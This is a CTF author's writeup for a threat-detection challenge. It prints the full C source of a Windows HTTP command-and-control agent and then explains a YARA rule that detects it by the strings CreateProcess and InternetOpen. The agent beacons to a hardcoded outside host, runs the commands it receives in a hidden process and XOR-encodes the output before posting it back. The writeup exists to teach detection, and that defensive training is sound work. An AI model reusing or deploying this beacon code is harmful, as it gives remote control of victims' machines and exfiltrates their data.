# YARA Verificator Writeup

## Overview 
![](src/renamed.png)

## Idea

Digital forensics in CTFs is not just disk analyzing. There are also memory forensics, network forensics, steganography (though not practically used anymore), file analysis, etc. I want to introduce a different type of digital forensics in this CTF. This is threat detection forensics challenge. 

This is the code i wrote to. 

The executables generated from this code cannot do anything to your computer because it will immediately be flagged by Windows Security because it uses antivirus software (AV software) like Microsoft Defender Antivirus to scan files and look for malware signatures and suspicious behaviour.  

It is not clean by any chance lol 
```C
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define C2_SERVER "cartoonnetwork.com:1888"
#define BEACON_INTERVAL 14005
#define XOR_KEY 0x83

void xor_encrypt_decrypt(char* data, size_t length) {
	for (size_t i = 0; i < length; i++) {
		data[i] ^= XOR_KEY;
	}
}

void SendResultToServer(const char* result) {
	size_t result_len = lstrlenA(result); //copy result to buffer
	char* encrypted = (char*)malloc(result_len + 1);
	lstrcpyA(encrypted, result);

	xor_encrypt_decrypt(encrypted, result_len); //encrypt

	HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hInternet) {
		free(encrypted);
		return;
	}
	HINTERNET hConnect = InternetConnect(hInternet, "cartoonnetwork.com", 1888, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (!hConnect) {
		InternetCloseHandle(hInternet);
		free(encrypted);
		return;
	}

	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/result", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

	if (hRequest) {
		HttpSendRequest(hRequest, NULL, 0, (LPVOID)encrypted, result_len);
		InternetCloseHandle(hRequest);
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	free(encrypted);
}

void ExecuteCommand(char* cmd) {
	// use CreateProcess to run command, send output back to server

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE; //allow child process to inherit write handle
	sa.lpSecurityDescriptor = NULL;

	HANDLE hStdoutRead, hStdoutWrite;

	if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
		/*printf("CreatePipe failed");*/
		return;
	}

	SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); // read handle is not inherited

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));

	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hStdoutWrite;
	si.wShowWindow = SW_HIDE; //hide console window


	char cmdLine[4096];
	/*snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);*/
	lstrcpyA(cmdLine, "notepad.exe /c ");
	lstrcatA(cmdLine, cmd);

	if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(hStdoutRead);
		CloseHandle(hStdoutWrite);
		/*printf("CreateProcess failed\n");*/
		return;
	}

	CloseHandle(hStdoutWrite); //close write handle in parent because child has its own copy

	char buffer[4096];
	char output[65536] = { 0 };
	DWORD bytesRead;
	size_t totalLength = 0;

	while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		if (totalLength + bytesRead < sizeof(output) - 1) {
			/*strncat_s(output, sizeof(output), buffer, _TRUNCATE);
			totalLength += bytesRead;*/
			for (DWORD i = 0; i < bytesRead && totalLength < sizeof(output) - 1; i++) {
				output[totalLength++] = buffer[i];
			}
			output[totalLength] = '\0';
		}
	}

	WaitForSingleObject(pi.hProcess, INFINITE); // wait process to finish

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdoutRead);

	SendResultToServer(output);

}

void Beacon() {

	while (1) {
		HINTERNET hInternet = InternetOpen("Mozilla/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		if (hInternet) {
			char url[256];
			/*snprintf(url, sizeof(url), "%s/poll", C2_SERVER);*/
			lstrcpy(url, C2_SERVER);
			lstrcat(url, "/poll");
			HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			if (hConnect) {
				char buffer[4096];
				DWORD bytesRead;


				if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
					buffer[bytesRead] = '\0';

					xor_encrypt_decrypt(buffer, bytesRead);
					ExecuteCommand(buffer);
				}

				InternetCloseHandle(hConnect);
			}
			InternetCloseHandle(hInternet);
		}
		Sleep(BEACON_INTERVAL);
	}
}

int main(void) {
	Beacon();
	return 0;
}


//startup info to define stdin, stdout, stderr
```

There are two sets of data originally that got mixed into one. One set includes all clean executable and dll files from `C:\Windows\SYSTEM32`. One set contains all the "malicious-wannabe" executable files that I created out of the source code above with a bit of variations for each one just to not duplicate them. 


## solution
The intended solve is something like this: 
```shell
rule http_c2_agent_sample
{
    strings:
        $create_process = "CreateProcess"
        $wininet1 = "InternetOpen"
    condition:
        all of them
}
```
## winapi
winapi is the API for Windows desktop and server applications. It is the set of functions and data strutures that your Windows applications are written with. 

### wininet?
WinINet API is one of the APIs under the Networking and Internet categories in the WinAPI.

Let's look at the instructions of the challenge again: `the malware disguised itself as a legitimate browser by mimicking common web traffic patterns`. This should indicate that there is some traffic happening. One of the hints linked to WinINet documentation. 

Basically, `InternetOpen` establishes the Internet connection to the client application.


[CreateProcess()](https://medium.com/@theCTIGuy/windows-api-highlight-createprocess-ec1ec0915b9c)

CreateProcess() is one of the most used WinAPI functions. It ... creates a process. Many processes running in the background  

[InternetOpen()](https://www.aldeid.com/wiki/InternetOpen) 
One of the parameters to `InternetOpen` is the `User-Agent` which is a good signature to it. 

Basically, how to write the detection rules for the correct samples are just to stick to what we are given and have observed so far, i.e. the descriptions. 

Okok I admit this is more a blue team CTF challenge. But as a digital forensist, you need to be detective and collecting pieces of information.  

To detect this, I wrote a rule that check for the function name "InternetOpen". 


As long as you can give all the conditions in the rule, it should return the correct set of unusual executable files. 
